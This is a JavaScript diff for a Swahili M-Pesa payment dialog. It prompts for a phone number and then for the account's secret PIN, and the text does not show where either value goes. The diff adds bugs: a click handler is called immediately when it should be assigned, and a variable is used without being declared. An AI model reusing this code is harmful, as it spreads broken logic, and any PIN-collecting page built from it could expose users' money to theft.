@@ -133,10 +133,15 @@ function put_number(){
 		  var element_ = document.createElement("div");
 		  element_.style.marginTop = 5 + "%";
 		   element_3.appendChild(element_);
-		  element_.innerHTML = "Weka number ya simu ya vodacom"
+		  element_.innerHTML = "M-Pesa"
 		   var element_4 = document.createElement("div");
 		  element_4.className = "buy_msg";
 		  element_2.appendChild(element_4);
+		  var element_text = document.createElement("div");
+		  element_text.style.marginTop = 2 + "%";
+		  element_text.style.padding = 5 + "%";
+		   element_4.appendChild(element_text);
+		  element_.innerHTML = "Weka number ya simu"
 		  var element_7 = document.createElement("div");
 		  element_4.appendChild(element_7);
 		  var element_8 = document.createElement("input");
@@ -163,7 +168,7 @@ function put_number(){
 		  element_10 = document.createElement("a");
 		  element_10.className = "button";
 		  element_10.innerHTML = "tuma";
-		  element_10.onclick = put_password;
+		  element_10.onclick = put_password("M-Pesa");
 		  element_10.style.backgroundColor = "#000";
 		  element_10.style.color = "#fff";
 		  element_10.style.borderBottomStyle = "none";
@@ -176,7 +181,7 @@ function put_number(){
 			     }
 		return false;  
 	}
-function put_password(){
+function put_password(tx){
 	       remove_no();
 	      var element = document.createElement("div");
 		  element.className = "varify_mpesa";
@@ -191,10 +196,15 @@ function put_password(){
 		  var element_ = document.createElement("div");
 		  element_.style.marginTop = 5 + "%";
 		   element_3.appendChild(element_);
-		  element_.innerHTML = "Weka number ya siri"
+		  element_.innerHTML = tx;
 		   var element_4 = document.createElement("div");
 		  element_4.className = "buy_msg";
 		  element_2.appendChild(element_4);
+		  var element_ = document.createElement("div");
+		  element_text.style.marginTop = 2 + "%";
+		  element_text.style.padding = 2 + "%";
+		  element_4.appendChild(element_text);
+		  element_text.innerHTML = "weka number ya siri";
 		  var element_7 = document.createElement("div");
 		  element_4.appendChild(element_7);
 		  var element_8 = document.createElement("input");
